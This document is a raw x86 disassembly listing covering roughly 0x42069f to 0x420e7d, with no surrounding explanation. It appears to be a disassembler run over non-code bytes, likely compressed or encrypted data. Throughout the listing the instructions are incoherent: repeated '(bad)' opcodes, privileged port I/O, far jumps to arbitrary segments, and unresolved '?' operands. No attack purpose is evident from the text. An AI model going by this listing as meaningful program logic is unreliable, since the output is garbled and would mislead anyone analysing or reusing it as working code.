  42069f:	jo     0x4206d5
  4206a1:	xor    al,dh
  4206a3:	loopne 0x420646
  4206a5:	sbb    al,0x73
  4206a7:	mov    cs,WORD PTR [esi+0x61]
  4206aa:	jmp    0x8909:0x39113939
  4206b1:	mov    dh,0x34
  4206b3:	mov    ds:0xb52f23b8,al
  4206b8:	lods   eax,DWORD PTR ds:[esi]
  4206b9:	(bad)  
  4206ba:	cmp    eax,0xf29c95b1
  4206bf:	fucomip st,st(6)
  4206c1:	shr    DWORD PTR [ecx-0x2fbf1dc3],1
  4206c7:	repz inc edi
  4206c9:	out    0xb6,eax
  4206cb:	fisttp QWORD PTR [edx+0x3b]
  4206ce:	movd   mm6,eax
  4206d1:	xchg   edx,eax
  4206d2:	ret    0x941c
  4206d5:	dec    edi
  4206d6:	and    eax,0x4f15d288
  4206db:	mov    ah,BYTE PTR [eax-0x70]
  4206de:	jo     0x420698
  4206e0:	mov    ah,0x32
  4206e2:	inc    bp
  4206e4:	push   ss
  4206e5:	push   esi
  4206e6:	retf   0xe0a0
  4206e9:	in     al,0x10
  4206eb:	xor    BYTE PTR [edx-0x52],ah
  4206ee:	scas   eax,DWORD PTR es:[edi]
  4206ef:	xchg   ebp,eax
  4206f0:	mov    ds:0xb1812696,eax
  4206f5:	(bad)  [eax+eax*8]
  4206f8:	inc    edx
  4206f9:	pushf  
  4206fa:	pop    ebp
  4206fb:	aaa    
  4206fc:	add    dh,dl
  4206fe:	jne    0x42074b
  420700:	stos   DWORD PTR es:[edi],eax
  420701:	(bad)  
  420702:	jp     0x420685
  420704:	jl     0x42074c
  420706:	lds    ecx,FWORD PTR [eax+0x53b57890]
  42070c:	xor    eax,0x85b59308
  420711:	push   ss
  420712:	xchg   edi,ebx
  420714:	adc    al,0x85
  420716:	loopne 0x42072b
  420718:	xchg   ecx,eax
  420719:	sar    edi,cl
  42071b:	sbb    DWORD PTR ds:0x70d2a2cf,esi
  420721:	fwait
  420722:	in     eax,0xfd
  420724:	cwde   
  420725:	out    0xf,al
  420727:	inc    edx
  420728:	stc    
  420729:	mov    ecx,0x9cf22f9
  42072e:	lahf   
  42072f:	sub    BYTE PTR [edi-0x480babfb],bl
  420735:	push   0x6b5f88dd
  42073a:	retf   0x45ca
  42073d:	repz into 
  42073f:	out    0x8e,al
  420741:	mov    esp,0x410fcb93
  420746:	mov    esp,0x36f0a067
  42074b:	inc    ecx
  42074c:	jp     0x42074f
  42074e:	sub    eax,0xaa74e4ed
  420753:	js     0x4207ac
  420755:	and    DWORD PTR [esi],esp
  420757:	pop    ds
  420758:	(bad)  
  420759:	aas    
  42075a:	pop    ebp
  42075b:	loope  0x42078a
  42075d:	jnp    0x420788
  42075f:	pop    eax
  420760:	pop    esp
  420761:	mov    al,0xa5
  420763:	dec    edi
  420764:	icebp  
  420765:	xor    ah,BYTE PTR [edx+0x2d]
  420768:	or     bl,BYTE PTR [edi]
  42076a:	shr    DWORD PTR [edi-0x790fcf5f],0xd9
  420771:	xor    BYTE PTR [ebp+edx*4+0x4e],al
  420775:	inc    eax
  420776:	mov    esp,0xb12d355
  42077b:	and    DWORD PTR [ebp+0x2e1daff0],esi
  420781:	mov    edx,0xef83fb37
  420786:	mov    dh,0x92
  420788:	call   0x4e46184
  42078d:	pop    ecx
  42078e:	cmp    DWORD PTR ds:0x3fa36590,esi
  420794:	sub    al,0x91
  420796:	and    esi,esp
  420798:	std    
  420799:	rcr    BYTE PTR [edi-0xa],1
  42079c:	lahf   
  42079d:	int3   
  42079e:	ret    0xa8eb
  4207a1:	add    cl,BYTE PTR [eax]
  4207a3:	cmp    BYTE PTR [eax+ebx*2+0x43],al
  4207a7:	call   0x113dd795
  4207ac:	mov    al,ds:0xb687acaf
  4207b1:	dec    esp
  4207b2:	imul   ebp,DWORD PTR [edi],0x5c
  4207b5:	fs (bad) 
  4207b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207b8:	dec    esp
  4207b9:	(bad)
  4207bc:	jb     0x4207a9
  4207be:	jbe    0x420804
  4207c0:	int    0x2c
  4207c2:	stc    
  4207c3:	xchg   ebx,eax
  4207c4:	jae    0x42083b
  4207c6:	xor    DWORD PTR [ebx+ebx*2+0xd2fb9],0x24
  4207ce:	inc    esp
  4207cf:	cmp    eax,0xd2b3b7e9
  4207d4:	jns    0x4207b4
  4207d6:	sbb    BYTE PTR [bp+si+0x70],cl
  4207da:	dec    ebx
  4207db:	adc    al,BYTE PTR [ebp+0xe]
  4207de:	test   eax,0xb2e3ac58
  4207e3:	pop    esp
  4207e4:	repnz push 0x5c54f7b
  4207ea:	dec    eax
  4207eb:	adc    BYTE PTR [ebp-0x53],al
  4207ee:	xor    DWORD PTR [edx-0x2910487a],eax
  4207f4:	push   ebp
  4207f5:	and    cl,BYTE PTR [ecx-0xd063506]
  4207fb:	lock outs dx,BYTE PTR ds:[esi]
  4207fd:	sub    BYTE PTR [edx],0xa8
  420800:	add    esi,ebx
  420802:	pop    ecx
  420803:	mov    ebp,0x3b2cf7ba
  420808:	sub    eax,0x7c846a71
  42080d:	inc    ecx
  42080e:	retf   
  42080f:	sbb    al,0xb2
  420811:	outs   dx,DWORD PTR ds:[esi]
  420812:	mov    edx,0xd3fd3dd8
  420817:	je     0x4207d3
  420819:	retf   
  42081a:	inc    esp
  42081b:	pop    ss
  42081c:	push   edx
  42081d:	and    bl,dh
  42081f:	cs pop ebp
  420821:	out    dx,eax
  420822:	ds mov esp,0xe3640341
  420828:	(bad)  
  420829:	imul   esp,DWORD PTR [esi],0xbbb8699e
  42082f:	adc    BYTE PTR [esi-0x9],0xd
  420833:	push   ecx
  420834:	test   BYTE PTR [esi],ch
  420836:	int    0xae
  420838:	mov    ch,0xb6
  42083a:	sbb    esp,edx
  42083c:	xor    dl,cl
  42083e:	sbb    al,0xe6
  420840:	pop    eax
  420841:	inc    edx
  420842:	shl    DWORD PTR [ecx+0x32b7f45d],0x7
  420849:	lods   eax,DWORD PTR ds:[esi]
  42084a:	out    0x66,eax
  42084c:	dec    edi
  42084d:	mov    gs:0xb7ee458f,al
  420853:	sar    ah,cl
  420855:	adc    al,0x6
  420857:	sub    eax,0x85f95c63
  42085c:	pop    edx
  42085d:	jno    0x4207f7
  42085f:	repz xchg esp,eax
  420861:	in     al,0xe5
  420863:	push   0xc25e31da
  420868:	dec    esi
  420869:	push   eax
  42086a:	lods   al,BYTE PTR ds:[esi]
  42086b:	inc    ecx
  42086c:	das    
  42086d:	call   0xc24631e4
  420872:	sub    al,0xdf
  420875:	xor    esi,DWORD PTR [ebp-0x72b0dfe5]
  42087b:	imul   ebp,DWORD PTR [eax+edi*4],0x6024745f
  420882:	punpckhwd mm5,mm1
  420885:	pop    eax
  420886:	shr    ch,0x8c
  420889:	jecxz  0x4208ea
  42088b:	out    0xca,eax
  42088d:	xor    DWORD PTR [ebx-0x4f],edi
  420890:	xor    cl,BYTE PTR [ebx]
  420892:	outs   dx,DWORD PTR ds:[esi]
  420893:	push   edi
  420894:	sahf   
  420895:	cmp    al,0x9c
  420897:	cli    
  420898:	addr16 pusha 
  42089a:	mov    ebp,?
  42089c:	rol    DWORD PTR ds:0xc3aadc57,1
  4208a2:	pusha  
  4208a3:	xlat   BYTE PTR ds:[ebx]
  4208a4:	imul   esp,DWORD PTR [ebp+0x4a48d635],0xfffffff1
  4208ab:	lds    esp,FWORD PTR ds:0x279668bc
  4208b1:	cmc    
  4208b2:	push   ss
  4208b3:	fldenv [esi+0x1d]
  4208b6:	popw   ss
  4208b8:	out    0x43,al
  4208ba:	push   ds
  4208bb:	shr    DWORD PTR [edi],0xfa
  4208be:	int3   
  4208bf:	and    ah,ah
  4208c1:	add    BYTE PTR [ebx+0x6f],dh
  4208c4:	sar    BYTE PTR [ecx],0x2f
  4208c7:	fiadd  WORD PTR [ecx+edi*4+0x5c]
  4208cb:	pop    ebp
  4208cc:	cmp    DWORD PTR [edi+0x3d],eax
  4208cf:	jo     0x420891
  4208d1:	sbb    eax,0x600f3019
  4208d6:	push   edx
  4208d7:	jae    0x42093c
  4208d9:	mov    BYTE PTR [edi-0x6e42f45e],dl
  4208df:	add    DWORD PTR [ebp-0x11],ecx
  4208e2:	retf   0x70dd
  4208e5:	ret    
  4208e6:	addr16 add al,0xba
  4208e9:	lock in al,0xae
  4208ec:	push   edx
  4208ed:	add    al,0x90
  4208ef:	or     BYTE PTR [edi+0x7a],ah
  4208f2:	sub    al,0x71
  4208f4:	out    0x19,al
  4208f6:	sbb    eax,0x1c06286c
  4208fb:	xchg   ecx,eax
  4208fc:	je     0x42096e
  4208fe:	dec    esi
  4208ff:	xor    DWORD PTR [eax],eax
  420901:	xchg   ecx,eax
  420902:	scas   al,BYTE PTR es:[edi]
  420903:	(bad)  
  420904:	loope  0x4208dc
  420906:	and    edi,DWORD PTR [edi+0x66]
  420909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42090a:	xor    dl,BYTE PTR [esi]
  42090c:	xor    eax,0x8c7944fd
  420911:	sub    ebx,DWORD PTR [ebx+0x6c]
  420914:	push   esi
  420915:	xor    DWORD PTR [esi-0x17],0x14
  420919:	jae    0x42095d
  42091b:	or     ebp,DWORD PTR [edi]
  42091d:	fiadd  DWORD PTR [eax]
  42091f:	daa    
  420920:	test   esi,esi
  420922:	sti    
  420923:	add    BYTE PTR ds:[eax],al
	...
  42092e:	add    BYTE PTR [eax],al
  420930:	add    BYTE PTR [ecx-0x57],cl
  420933:	cmp    BYTE PTR [ebp-0x2126208],bl
  420939:	pop    edx
  42093a:	rcr    BYTE PTR [eax+edx*2-0x12e9a510],0x19
  420942:	add    DWORD PTR [ecx],0x0
  420945:	stos   DWORD PTR es:[edi],eax
  420946:	add    eax,DWORD PTR [eax]
  420948:	add    BYTE PTR [ebp-0x30],dh
  42094b:	js     0x4208f9
  42094d:	jp     0x420975
  42094f:	jl     0x42098c
  420951:	mov    al,ds:0xb2c48374
  420956:	rep outs dx,DWORD PTR ds:[esi]
  420958:	clc    
  420959:	and    al,0x49
  42095b:	mov    eax,0x6f7db834
  420960:	sub    ebx,DWORD PTR cs:0x8d5dee0d
  420967:	sbb    al,0x71
  420969:	sti    
  42096a:	add    eax,0x160f5173
  42096f:	out    0xa9,eax
  420971:	sahf   
  420972:	fs repz xchg ah,bl
  420976:	stc    
  420977:	mov    ch,cl
  420979:	and    al,0x35
  42097b:	sbb    DWORD PTR [ecx],ebp
  42097d:	cmp    eax,0x7c6ffeeb
  420982:	adc    ch,BYTE PTR [esi-0x77330507]
  420988:	iret   
  420989:	loop   0x42096a
  42098b:	stos   DWORD PTR es:[edi],eax
  42098c:	(bad)  
  42098d:	fcmovu st,st(2)
  42098f:	loopne 0x420944
  420991:	push   esp
  420992:	adc    BYTE PTR ds:0xac3e2034,0x66
  420999:	ror    DWORD PTR [esi],cl
  42099b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42099c:	sub    DWORD PTR [ebx+ebx*2],esp
  42099f:	imul   ecx,esp,0x2a6cda40
  4209a5:	cmp    DWORD PTR [edi],esp
  4209a7:	sub    edx,DWORD PTR [edx]
  4209a9:	fild   WORD PTR [ebp-0x171eee29]
  4209af:	frstor [edi-0x4538ca06]
  4209b5:	inc    edi
  4209b6:	push   0xd5530021
  4209bb:	adc    BYTE PTR [ebx+0x44377bfd],dl
  4209c1:	xor    BYTE PTR [ecx],bh
  4209c3:	cmc    
  4209c4:	(bad)  
  4209c5:	jmp    0xd0cbf5d2
  4209ca:	push   ecx
  4209cb:	sti    
  4209cc:	nop
  4209cd:	int    0xa8
  4209cf:	and    al,BYTE PTR [edi-0x1446d4dc]
  4209d5:	lahf   
  4209d6:	pop    ebx
  4209d7:	ss dec ebx
  4209d9:	dec    ebp
  4209da:	jmp    0x4209ae
  4209dc:	shl    DWORD PTR [ecx-0x50],0x2c
  4209e0:	jle    0x4209ce
  4209e2:	ins    DWORD PTR es:[edi],dx
  4209e3:	call   0xae8d:0xb5898728
  4209ea:	repz shr DWORD PTR [ecx-0x53],0x5a
  4209ef:	ja     0x420995
  4209f1:	pop    es
  4209f2:	jg     0x420a29
  4209f4:	imul   BYTE PTR ds:0xd0a11a33
  4209fa:	stos   BYTE PTR es:[edi],al
  4209fb:	mov    esi,0xcd51e0bc
  420a00:	fist   DWORD PTR [esi-0x3]
  420a03:	push   ds
  420a04:	dec    eax
  420a05:	adc    ecx,ebp
  420a07:	dec    eax
  420a08:	push   ecx
  420a09:	and    eax,0x1dba3f79
  420a0e:	repnz sbb al,0xfe
  420a11:	sub    eax,0xdb7afbd5
  420a16:	or     DWORD PTR [edi+0xba473c3],ecx
  420a1c:	sbb    BYTE PTR [ecx-0x7ac86b50],bl
  420a22:	adc    cl,ah
  420a24:	or     eax,0x4ae202bb
  420a29:	fwait
  420a2a:	push   0x9ca09ed3
  420a2f:	stos   BYTE PTR es:[edi],al
  420a30:	push   ss
  420a31:	dec    edi
  420a32:	outs   dx,DWORD PTR ds:[esi]
  420a33:	lods   al,BYTE PTR ds:[esi]
  420a34:	retf   
  420a35:	jp     0x420a1a
  420a37:	pop    es
  420a38:	lahf   
  420a39:	pop    edi
  420a3a:	jne    0x420aa6
  420a3c:	lods   eax,DWORD PTR ds:[esi]
  420a3d:	arpl   di,cx
  420a3f:	imul   edi,DWORD PTR [ecx],0xffffffaa
  420a42:	mov    esp,0x7b4a05cd
  420a47:	jno    0x420a5d
  420a49:	(bad)
  420a4c:	aas    
  420a4d:	inc    ebp
  420a4e:	mov    bl,0xfd
  420a50:	or     al,0x72
  420a52:	mov    esp,0xcb98b32f
  420a57:	or     edx,DWORD PTR [edi+edi*2-0x2ef78b0f]
  420a5e:	jl     0x420a8b
  420a60:	(bad)  
  420a61:	push   edi
  420a62:	aas    
  420a63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a64:	out    0xb,eax
  420a66:	and    BYTE PTR [esi+0x5df67093],0xd8
  420a6d:	push   edx
  420a6e:	sbb    esi,DWORD PTR [ebx+0x41]
  420a71:	xor    bh,BYTE PTR [edi-0x67e82e5b]
  420a77:	ficomp WORD PTR [edx]
  420a79:	xchg   edx,eax
  420a7a:	push   ecx
  420a7b:	imul   ebx,DWORD PTR [ecx+ebp*1-0x4e],0xffffffd3
  420a80:	dec    ecx
  420a81:	rol    DWORD PTR [ebp+0x62],0x55
  420a85:	adc    BYTE PTR [edx],0x86
  420a88:	(bad)  
  420a89:	out    dx,eax
  420a8a:	xadd   dl,bl
  420a8d:	mov    BYTE PTR [edi],al
  420a8f:	mov    ch,0x94
  420a91:	jmp    0x420b0f
  420a93:	mov    ch,0x46
  420a95:	or     dl,BYTE PTR [edx+0x6a]
  420a98:	sbb    al,0x17
  420a9a:	div    BYTE PTR [edi-0x22358449]
  420aa0:	xor    al,0xea
  420aa2:	mov    dl,0xbd
  420aa4:	pop    eax
  420aa5:	cmp    DWORD PTR [ebx],ecx
  420aa7:	xchg   esi,eax
  420aa8:	dec    ebp
  420aa9:	mov    ch,0xb9
  420aab:	(bad)  
  420aac:	jle    0x420a5c
  420aae:	adc    ebx,esi
  420ab0:	sbb    al,BYTE PTR ds:0x8c1a9b7
  420ab6:	stos   BYTE PTR es:[edi],al
  420ab7:	mov    ah,0x7b
  420ab9:	jp     0x420a4f
  420abb:	lock ret 
  420abd:	ret    
  420abe:	rcl    dl,1
  420ac0:	ds push ecx
  420ac2:	and    al,0xb3
  420ac4:	dec    esi
  420ac5:	ret    0x253b
  420ac8:	fdiv   DWORD PTR [ebx]
  420aca:	inc    ecx
  420acb:	test   al,0xd3
  420acd:	pop    es
  420ace:	mov    es,ecx
  420ad0:	pop    ebx
  420ad1:	or     al,dl
  420ad3:	aam    0xab
  420ad5:	or     esp,DWORD PTR [ebp-0x73da60b1]
  420adb:	xchg   ebp,eax
  420adc:	jp     0x420a81
  420ade:	cmp    BYTE PTR [edx+0x39],dl
  420ae1:	fnstenv [ebx*2-0x6b25ac36]
  420ae8:	call   0x113b:0x4ad67e91
  420aef:	cmp    ebx,DWORD PTR [edi]
  420af1:	inc    edi
  420af2:	aam    0x97
  420af4:	iret   
  420af5:	lock ss dec esi
  420af8:	jecxz  0x420b3a
  420afa:	add    ecx,DWORD PTR [eax+0x91e5598]
  420b00:	into   
  420b01:	dec    ecx
  420b02:	and    esp,DWORD PTR [edi+0x1b2de2e6]
  420b08:	and    esp,DWORD PTR [ebx]
  420b0a:	icebp  
  420b0b:	out    0xc1,eax
  420b0d:	lods   al,BYTE PTR ds:[esi]
  420b0e:	or     eax,0x2b3ef7b6
  420b13:	xchg   BYTE PTR [esi+0x1c77907a],ch
  420b19:	inc    esi
  420b1a:	test   al,0x8d
  420b1c:	jae    0x420b65
  420b1e:	push   ss
  420b1f:	(bad)  
  420b20:	dec    esp
  420b21:	xor    bl,BYTE PTR [bx+si]
  420b24:	pop    eax
  420b25:	jmp    0xd9ae:0x53dbad7f
  420b2c:	popf   
  420b2d:	mov    ds:0x9ce4b2b9,al
  420b32:	je     0x420b80
  420b34:	ja     0x420b9d
  420b36:	and    BYTE PTR [edi-0x68e59d1e],cl
  420b3c:	mov    ds:0x37135eed,al
  420b41:	sbb    dh,bl
  420b43:	pop    eax
  420b44:	mov    ch,0x5e
  420b46:	dec    esi
  420b47:	aad    0x25
  420b49:	push   0x2f
  420b4b:	(bad)  
  420b4c:	imul   edx,DWORD PTR [edi+0x53],0x37
  420b50:	mov    WORD PTR [edx],cs
  420b52:	inc    ebp
  420b53:	(bad)  
  420b54:	adc    ecx,ebp
  420b56:	add    BYTE PTR ds:0x739872b5,dl
  420b5c:	int3   
  420b5d:	call   0x6cbc:0xd09b146f
  420b64:	bound  ecx,QWORD PTR [eax]
  420b66:	sbb    ch,BYTE PTR [edi]
  420b68:	push   ds
  420b69:	sbb    cl,dl
  420b6b:	sub    DWORD PTR [esi+0x38665da2],ecx
  420b71:	push   ecx
  420b72:	cmc    
  420b73:	add    al,BYTE PTR [esi+0x787e7d39]
  420b79:	jmp    0xd17f:0xcb11c193
  420b80:	pop    esi
  420b81:	scas   al,BYTE PTR es:[edi]
  420b82:	ins    DWORD PTR es:[edi],dx
  420b83:	cld    
  420b84:	mov    ds:0xcc88d389,eax
  420b89:	stos   BYTE PTR es:[edi],al
  420b8a:	(bad)  
  420b8b:	js     0x420b6b
  420b8d:	pop    edi
  420b8e:	dec    esi
  420b8f:	push   ss
  420b90:	imul   BYTE PTR [esi-0x71]
  420b93:	call   0xbbecba7b
  420b98:	lds    eax,FWORD PTR [edi+0x2595d3b]
  420b9e:	mov    dh,BYTE PTR [edx]
  420ba0:	jl     0x420bca
  420ba2:	into   
  420ba3:	aad    0x6f
  420ba5:	sbb    eax,0x1fc7b65c
  420baa:	stos   DWORD PTR es:[edi],eax
  420bab:	xchg   ebx,eax
  420bac:	inc    esp
  420bad:	jb     0x420c2b
  420baf:	ffree  st(1)
  420bb1:	ss dec edi
  420bb3:	jmp    0x420ba7
  420bb5:	loopne 0x420ba4
  420bb7:	xor    BYTE PTR cs:[ebx+esi*4-0x4a1d27cc],0x8a
  420bc0:	push   0x61
  420bc2:	repnz mov edi,0xcbf112f9
  420bc8:	inc    esp
  420bc9:	popa   
  420bca:	cmc    
  420bcb:	lahf   
  420bcc:	idiv   DWORD PTR [edx+edx*2+0x6e526195]
  420bd3:	dec    esi
  420bd4:	fdivr  DWORD PTR [eax-0x5d]
  420bd7:	stos   DWORD PTR es:[edi],eax
  420bd8:	stos   DWORD PTR es:[edi],eax
  420bd9:	mov    ds:0xe6d4481e,al
  420bde:	pop    eax
  420bdf:	mov    ebp,0x68df7d31
  420be4:	mov    edi,0xe4bf9d
  420be9:	add    dl,dh
  420beb:	sub    eax,0x470b0dcc
  420bf0:	das    
  420bf1:	push   0x6ecf1a17
  420bf6:	in     al,0xe6
  420bf8:	daa    
  420bf9:	sub    ah,BYTE PTR [ebx+0x1e4604f2]
  420bff:	out    dx,eax
  420c00:	push   edi
  420c01:	(bad)  
  420c02:	xchg   ebx,eax
  420c03:	mov    ah,bh
  420c05:	call   0xff1c60c8
  420c0a:	gs push esi
  420c0c:	pop    es
  420c0d:	and    BYTE PTR ds:0x88ed2dc6,dl
  420c13:	(bad)  
  420c14:	cmp    eax,0xa789f2f7
  420c19:	push   edx
  420c1a:	lahf   
  420c1b:	test   eax,0x155ac0ec
  420c20:	inc    ebx
  420c21:	sbb    edi,edi
  420c23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c24:	mov    dl,0x14
  420c26:	pop    ebx
  420c27:	xchg   DWORD PTR [esi-0x63],edi
  420c2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c2b:	je     0x420bed
  420c2d:	mov    dl,BYTE PTR [ebp+0x29]
  420c30:	(bad)  
  420c31:	mov    ch,0x71
  420c33:	cdq    
  420c34:	push   ss
  420c35:	xchg   edi,eax
  420c36:	outs   dx,DWORD PTR ds:[esi]
  420c37:	pusha  
  420c38:	in     eax,dx
  420c39:	sub    DWORD PTR [ebp-0x2399448],esp
  420c3f:	fistp  WORD PTR [esi+ebx*2-0x11]
  420c43:	ins    BYTE PTR es:[edi],dx
  420c44:	adc    DWORD PTR [edi],ecx
  420c46:	push   ss
  420c47:	mov    ss,esi
  420c49:	fs push ecx
  420c4b:	or     BYTE PTR [ecx],dh
  420c4d:	es push ds
  420c4f:	pop    ecx
  420c50:	lods   eax,DWORD PTR ds:[esi]
  420c51:	sub    eax,0xcbf7f9ad
  420c56:	adc    DWORD PTR [esi-0x7d],esp
  420c59:	aad    0x76
  420c5b:	icebp  
  420c5c:	jbe    0x420bf1
  420c5e:	ror    esi,cl
  420c60:	mov    ?,edi
  420c62:	pop    eax
  420c63:	mov    al,0xbf
  420c65:	mov    edi,0xfcc22e46
  420c6a:	stos   BYTE PTR es:[edi],al
  420c6b:	daa    
  420c6c:	inc    edi
  420c6d:	add    al,0x20
  420c6f:	sahf   
  420c70:	mov    bl,0xa0
  420c72:	mov    BYTE PTR [eax+eiz*2-0x5e],ch
  420c76:	mov    edi,0x2c3374d1
  420c7b:	xor    esi,DWORD PTR [edx+ebx*1-0x51125738]
  420c82:	pop    ecx
  420c83:	dec    esp
  420c84:	dec    esi
  420c85:	add    al,0x2
  420c87:	jmp    0x7840a4eb
  420c8c:	(bad)  
  420c8d:	dec    ebp
  420c8e:	jg     0x420c2e
  420c90:	sub    DWORD PTR [ebx+0x21],ecx
  420c93:	mov    dl,0x4
  420c95:	les    ecx,FWORD PTR [edi]
  420c97:	and    BYTE PTR [edi],bh
  420c99:	sub    eax,0xe1f00f4b
  420c9e:	lock jl 0x420ca2
  420ca1:	jnp    0x420c75
  420ca3:	xor    eax,0xdbdab8b8
  420ca8:	or     eax,0xea295dc4
  420cad:	inc    ecx
  420cae:	fild   WORD PTR [ebx+0x26f9bc22]
  420cb4:	sbb    DWORD PTR [ebx],ebp
  420cb6:	or     al,0xf0
  420cb8:	jle    0x420d23
  420cba:	outs   dx,BYTE PTR ds:[esi]
  420cbb:	mov    ah,0x56
  420cbd:	ins    BYTE PTR es:[edi],dx
  420cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cbf:	retf   0x2e4f
  420cc2:	cmp    al,0x80
  420cc4:	sub    eax,0x47e6d077
  420cc9:	es mov cl,0x66
  420ccc:	mov    al,ds:0x2c603959
  420cd1:	out    0x35,eax
  420cd3:	fldcw  WORD PTR [ebx]
  420cd5:	daa    
  420cd6:	ins    DWORD PTR es:[edi],dx
  420cd7:	fiadd  DWORD PTR [edx]
  420cd9:	int3   
  420cda:	mov    eax,ds:0x1780100
  420cdf:	push   eax
  420ce0:	pop    eax
  420ce1:	inc    ebp
  420ce2:	cmc    
  420ce3:	rcl    DWORD PTR [edx+0x20af9cd6],cl
  420ce9:	stos   DWORD PTR es:[edi],eax
  420cea:	test   DWORD PTR [eax],ebx
  420cec:	xor    al,0x74
  420cee:	pop    edi
  420cef:	clc    
  420cf0:	(bad)  
  420cf1:	jne    0x420c90
  420cf3:	pop    DWORD PTR [eax]
	...
  420d01:	es mov eax,0xbf9f8f0d
  420d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d08:	mov    ecx,0xfe336cff
  420d0d:	pop    ecx
  420d0e:	sub    edx,eax
  420d10:	jp     0x420cd6
  420d12:	xchg   BYTE PTR [ecx],al
  420d14:	add    BYTE PTR [ebx-0x23fffffd],ch
  420d1a:	aaa    
  420d1b:	ror    BYTE PTR [edi+0x130006d2],cl
  420d21:	leave  
  420d22:	cld    
  420d23:	push   ecx
  420d24:	mov    ecx,0x4f9642e4
  420d29:	sub    BYTE PTR [edx-0x43],al
  420d2c:	jle    0x420d6e
  420d2e:	jle    0x420d86
  420d30:	cli    
  420d31:	call   0x2d26:0xe786edc5
  420d38:	adc    cl,BYTE PTR [ebx]
  420d3a:	jno    0x420d4f
  420d3c:	test   eax,ecx
  420d3e:	mov    cl,0x74
  420d40:	rcr    DWORD PTR [edi+0x57],cl
  420d43:	xchg   DWORD PTR [ecx+0x440945aa],esp
  420d49:	jl     0x420d63
  420d4b:	scas   al,BYTE PTR es:[edi]
  420d4c:	sbb    BYTE PTR [ecx+0x19],al
  420d4f:	imul   edx,DWORD PTR [ebx-0x52],0x471fefe3
  420d56:	inc    ebp
  420d57:	fstp   DWORD PTR [edi+ebp*1]
  420d5a:	mov    ds:0xe8228822,al
  420d5f:	dec    esi
  420d60:	mov    esi,0xdff572cb
  420d65:	mov    bh,bh
  420d67:	adc    ecx,esp
  420d69:	dec    esi
  420d6a:	iret   
  420d6b:	pop    esp
  420d6c:	(bad)  
  420d6e:	inc    esp
  420d6f:	mov    dl,0x9f
  420d71:	inc    eax
  420d72:	xor    BYTE PTR [esi+0x22c19bf],dl
  420d78:	sub    al,0xf4
  420d7a:	xchg   esi,eax
  420d7b:	lahf   
  420d7c:	jo     0x420d9d
  420d7e:	jbe    0x420dcf
  420d80:	arpl   sp,di
  420d82:	cmp    eax,DWORD PTR [bx-0x5bd8]
  420d87:	les    edi,FWORD PTR [eax-0x7b190897]
  420d8d:	xchg   edx,eax
  420d8e:	aas    
  420d8f:	mov    bh,0xf2
  420d91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d92:	pop    esp
  420d93:	daa    
  420d94:	xor    eax,0x214873c4
  420d99:	(bad)  
  420d9a:	cs sbb eax,0x70450110
  420da0:	stos   DWORD PTR es:[edi],eax
  420da1:	shl    DWORD PTR [eax-0x493dbdbd],cl
  420da7:	not    BYTE PTR gs:[edi+esi*1]
  420dab:	cmp    eax,0xfe26cc0a
  420db0:	lahf   
  420db1:	or     BYTE PTR [esi+edi*4-0x6a1f9258],0x9a
  420db9:	jae    0x420da3
  420dbb:	adc    DWORD PTR [edx-0x33],eax
  420dbe:	sbb    ebp,0xffffffc8
  420dc1:	inc    ecx
  420dc2:	pop    esp
  420dc3:	mov    dh,0xa2
  420dc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dc6:	mov    ch,0xae
  420dc8:	cmp    eax,0xb652eaa
  420dcd:	pop    edi
  420dce:	gs std 
  420dd0:	sahf   
  420dd1:	push   ebp
  420dd2:	push   esp
  420dd3:	mov    ebp,0x33b68ab7
  420dd8:	sbb    DWORD PTR [esi*1-0x3cce77ac],eax
  420ddf:	test   esp,0x1366309b
  420de5:	add    al,0xfe
  420de7:	test   eax,0x5e448955
  420dec:	mov    esp,edx
  420dee:	push   edx
  420def:	scas   al,BYTE PTR es:[edi]
  420df0:	je     0x420e1c
  420df2:	test   DWORD PTR ds:0xfd86e391,ecx
  420df8:	jp     0x420e3b
  420dfa:	hlt    
  420dfb:	icebp  
  420dfc:	js     0x420e2f
  420dfe:	and    ch,BYTE PTR [edx+0x7b5e7224]
  420e04:	push   ecx
  420e05:	imul   eax,DWORD PTR [edi-0xfbe34f5],0x2a
  420e0c:	mov    dl,0xcd
  420e0e:	inc    ebp
  420e0f:	and    eax,0x1d615094
  420e14:	out    0xde,eax
  420e16:	mov    eax,ds:0xcaec5639
  420e1b:	fadd   DWORD PTR [eax+ecx*4-0x3eac0c14]
  420e22:	(bad)  
  420e23:	and    eax,0x45015d1c
  420e28:	fstp   TBYTE PTR [ebp-0x7d66dc75]
  420e2e:	jno    0x420dce
  420e30:	scas   al,BYTE PTR es:[edi]
  420e31:	je     0x420e31
  420e33:	out    dx,al
  420e34:	jns    0x420deb
  420e36:	push   esp
  420e37:	mov    eax,ds:0xc5035112
  420e3c:	(bad)  
  420e3d:	retf   
  420e3e:	sub    esi,DWORD PTR [ecx+ebx*8]
  420e41:	retf   0xafdb
  420e44:	xchg   ebp,eax
  420e45:	xchg   edx,eax
  420e46:	leave  
  420e47:	mov    ah,0xd6
  420e49:	pop    ebp
  420e4a:	outs   dx,DWORD PTR ds:[esi]
  420e4b:	int3   
  420e4c:	in     eax,dx
  420e4d:	push   edi
  420e4e:	inc    esi
  420e4f:	jmp    0x420e6b
  420e51:	cmp    eax,0x216e7155
  420e56:	xor    esi,edi
  420e58:	in     al,0xf7
  420e5a:	and    esp,esp
  420e5c:	jl     0x420df2
  420e5e:	mov    dl,0x5e
  420e60:	arpl   WORD PTR [ebx],bp
  420e62:	dec    ecx
  420e63:	popf   
  420e64:	mov    dl,0xa2
  420e66:	or     ebp,esp
  420e68:	ror    ebx,1
  420e6a:	xchg   edi,eax
  420e6b:	xlat   BYTE PTR ds:[ebx]
  420e6c:	imul   edi,DWORD PTR [ecx+0x33],0xbaedf8f0
  420e73:	xor    edi,edx
  420e75:	sbb    bl,dh
  420e77:	mov    ss,WORD PTR [eax+0x45e5b178]
  420e7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
